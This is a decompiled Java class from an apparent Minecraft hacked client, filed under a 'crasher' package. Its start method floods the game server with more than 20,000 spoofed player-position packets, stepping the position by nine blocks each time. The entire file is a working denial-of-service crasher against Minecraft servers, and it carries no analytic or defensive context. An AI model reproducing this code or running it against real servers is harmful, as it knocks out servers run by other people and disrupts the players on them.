// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.flc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.client.Minecraft;

public class FlyCrasher2
{
    public static void start() {
        if (!Minecraft.getMinecraft().player.capabilities.allowFlying) {
            return;
        }
        final double playerX = Minecraft.getMinecraft().player.posX;
        final double playerY = Minecraft.getMinecraft().player.posY;
        final double playerZ = Minecraft.getMinecraft().player.posZ;
        double y = 0.0;
        final double x = 0.0;
        double z = 0.0;
        for (int i = 0; i < 200; ++i) {
            y = i * 9;
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayer.Position(playerX, playerY + y, playerZ, false));
        }
        for (int i = 0; i < 10000; ++i) {
            z = i * 9;
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayer.Position(playerX, playerY + y, playerZ + z, false));
        }
        for (int i = 0; i < 10000; ++i) {
            z = i * 9;
            Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayer.Position(playerX, playerY + y, playerZ + z, false));
        }
    }
}
